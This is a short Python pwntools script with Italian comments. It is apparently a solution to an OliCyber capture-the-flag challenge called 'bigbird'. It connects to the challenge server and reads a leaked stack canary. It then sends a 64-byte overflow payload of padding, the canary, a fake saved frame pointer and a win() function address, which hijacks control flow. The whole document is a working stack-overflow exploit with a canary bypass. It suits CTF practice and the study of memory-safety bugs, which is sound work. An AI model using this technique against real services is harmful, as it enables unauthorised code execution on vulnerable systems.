import struct
from pwn import *

def main():
    conn = remote('bigbird.challs.olicyber.it', 12006)
    conn.recvuntil("Here, take some data about this BIG BIRD: ")

    # Ricevi il canary e convertilo in formato integer (assumiamo che sia in formato esadecimale)
    canary = int(conn.recvline().strip(), 16)
    print(f'canary: {hex(canary)}')
    
    conn.recvline()

    win_addr = 0x401715

    # Creazione del buffer di payload
    payload = bytearray(64)
    
    # Riempie il buffer fino al canary (40 byte di 'A')
    payload[:40] = b'A' * 40
    
    # Inserisce il valore del canary (8 byte)
    payload[40:48] = struct.pack('<Q', canary)
    
    # Riempie RBP fittizio (8 byte di 'B')
    payload[48:56] = b'B' * 8
    
    # Inserisce l'indirizzo della funzione win() (8 byte)
    payload[56:64] = struct.pack('<Q', win_addr)
    
    # Stampa il payload (opzionale: per debug)
    print(f"Payload: {payload.hex()}")
    
    # Invia il payload
    conn.sendline(payload)

    # Ricevi la risposta
    response = conn.recvall()
    print(response.decode())

if __name__ == "__main__":
    main()
